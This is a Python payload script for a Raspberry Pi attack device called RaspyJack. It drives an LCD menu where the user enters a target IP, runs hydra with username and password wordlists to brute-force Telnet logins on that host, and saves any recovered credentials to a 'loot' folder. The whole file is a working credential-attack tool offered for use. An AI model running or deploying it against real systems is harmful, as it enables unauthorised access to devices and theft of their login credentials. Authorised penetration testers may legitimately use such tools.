#!/usr/bin/env python3
"""
RaspyJack *payload* – **Telnet Brute-Force Attack**
=================================================
This payload performs a Telnet brute-force attack against a target IP address
using `hydra`. It allows the user to input the target IP directly on the LCD
and displays the attack status and any found credentials. The attack runs
in a background thread to keep the UI responsive.

Features:
- Interactive UI for entering target IP address.
- Uses `hydra` for Telnet brute-forcing with specified wordlists.
- Displays attack status and found credentials on the LCD.
- Runs brute-force in a background thread.
- Graceful exit via KEY3 or Ctrl-C, ensuring `hydra` is terminated.
- Dynamically determines the active network interface.

Controls:
- MAIN SCREEN:
    - OK: Start/Enter Target IP
    - KEY3: Exit Payload
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position
    - LEFT/RIGHT: Move cursor
    - OK: Confirm IP and start attack
    - KEY3: Cancel IP input and return to main screen
"""

import sys
import os
import time
import signal
import subprocess
import threading
import re # For IP validation

sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# WiFi Integration - Import dynamic interface support
try:

    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import get_best_interface
    WIFI_INTEGRATION_AVAILABLE = True
except ImportError:
    WIFI_INTEGRATION_AVAILABLE = False
    def get_best_interface():
        return "eth0" # Fallback

RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
TARGET_IP = "192.168.1.22"
USER_LIST = os.path.join(RASPYJACK_DIR, "wordlists", "telnet_users.txt")
PASS_LIST = os.path.join(RASPYJACK_DIR, "wordlists", "telnet_pass.txt")
LOOT_DIR = os.path.join(RASPYJACK_DIR, "loot", "Bruteforce")

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_thread = None
hydra_process = None # To keep track of the hydra subprocess
status_msg = "Press OK to start"
found_creds = ""
current_ip_input = "192.168.1.22"
ip_input_cursor_pos = 0
ip_input_segment = 0
NETWORK_INTERFACE = get_best_interface() # Dynamically get the best interface

def cleanup(*_):
    global running
    running = False
    stop_attack_process() # Ensure hydra is terminated

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def stop_attack_process():
    """Terminate the hydra process if it's running."""
    global hydra_process
    if hydra_process and hydra_process.poll() is None:
        try:
            hydra_process.terminate()
            hydra_process.wait(timeout=5)
            print("Hydra process terminated.")
        except (subprocess.TimeoutExpired, ProcessLookupError):
            hydra_process.kill()
            print("Hydra process killed.")
        hydra_process = None

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    
    # Header
    d.text((5, 5), "Telnet Brute-Force", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    d.text((5, 115), f"IF: {NETWORK_INTERFACE}", font=FONT, fill="gray") # Display interface

    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        if found_creds:
            d.text((10, 40), "SUCCESS!", font=FONT_TITLE, fill="lime")
            d.text((10, 60), found_creds, font=FONT, fill="white")
        else:
            d.text((10, 60), status_msg, font=FONT, fill="yellow")
            
        d.text((5, 100), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Target IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "UP/DOWN=Digit | LEFT/RIGHT=Move", font=FONT, fill="cyan")
        d.text((5, 110), "OK=Confirm | KEY3=Cancel", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input():
    global current_ip_input, ip_input_cursor_pos, ip_input_segment
    
    # Ensure IP is valid or reset
    parts = current_ip_input.split('.')
    if not (len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts)):
        current_ip_input = "192.168.1.22"
        ip_input_cursor_pos = 0
        ip_input_segment = 0
    
    draw_ui("ip_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return False # Cancel
        
        if btn == "OK":
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return True # Valid IP
            else:
                draw_ui(message_lines=["Invalid IP!", "Try again."])
                time.sleep(2)
                current_ip_input = "192.168.1.22"
                ip_input_cursor_pos = 0
                ip_input_segment = 0
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else:
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    # Move past the dot
                    if btn == "UP": # Treat UP/DOWN on a dot as moving right/left
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.1)
    return False

def run_attack(target_ip):
    global status_msg, found_creds, hydra_process
    
    os.makedirs(LOOT_DIR, exist_ok=True)
    output_file = os.path.join(LOOT_DIR, f"telnet_brute_{target_ip}.txt")
    
    status_msg = f"Attacking {target_ip}..."
    draw_ui("main") # Update UI with status
    
    try:
        command = ["hydra", "-L", USER_LIST, "-P", PASS_LIST, "-t", "4", "-o", output_file, f"telnet://{target_ip}"]
        # Use Popen to allow termination
        hydra_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = hydra_process.communicate(timeout=600) # Wait for process to complete or timeout
        
        if hydra_process.returncode == 0: # Hydra usually exits 0 even if no creds found
            with open(output_file, "r") as f:
                for line in f:
                    if "host:" in line and "login:" in line:
                        parts = line.split()
                        login = parts[parts.index("login:")+1]
                        password = parts[parts.index("password:")+1]
                        found_creds = f"{login}:{password}"
                        status_msg = "Credentials Found!"
                        return

            status_msg = "No creds found."
        else:
            status_msg = f"Hydra exited with error: {hydra_process.returncode}"
            print(f"Hydra stderr: {stderr}", file=sys.stderr)

    except subprocess.TimeoutExpired:
        stop_attack_process() # Ensure hydra is killed if it times out
        status_msg = "Attack timed out!"
    except Exception as e:
        status_msg = "Attack failed!"
        print(f"Hydra attack failed: {e}", file=sys.stderr)
    finally:
        hydra_process = None # Clear process reference
    draw_ui("main") # Update UI with final status

if __name__ == "__main__":
    try:
        if subprocess.run("which hydra", shell=True, capture_output=True).returncode != 0:
            draw_ui(message_lines=["ERROR:", "`hydra` not found!", "Install with:", "`sudo apt install hydra`"])
            time.sleep(5)
            raise SystemExit("`hydra` command not found.")
        if not (os.path.exists(USER_LIST) and os.path.exists(PASS_LIST)):
            draw_ui(message_lines=["ERROR:", "Wordlists not found!", "Check:", f"{USER_LIST}", f"{PASS_LIST}"])
            time.sleep(5)
            raise SystemExit("Wordlists not found.")

        current_screen = "main"

        while running:
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0:
                    current_screen = "ip_input"
                    time.sleep(0.3)
            
            elif current_screen == "ip_input":
                if handle_ip_input():
                    TARGET_IP = current_ip_input
                    if not (attack_thread and attack_thread.is_alive()):
                        found_creds = ""
                        attack_thread = threading.Thread(target=run_attack, args=(TARGET_IP,), daemon=True)
                        attack_thread.start()
                    current_screen = "main"
                else: # IP input cancelled or invalid
                    current_screen = "main"
                time.sleep(0.3)

            time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_ui(message_lines=[f"CRITICAL ERROR:", f"{str(e)[:20]}"], color="red")
        time.sleep(3)
    finally:
        stop_attack_process() # Ensure hydra is terminated on final exit
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Telnet Brute-Force payload finished.")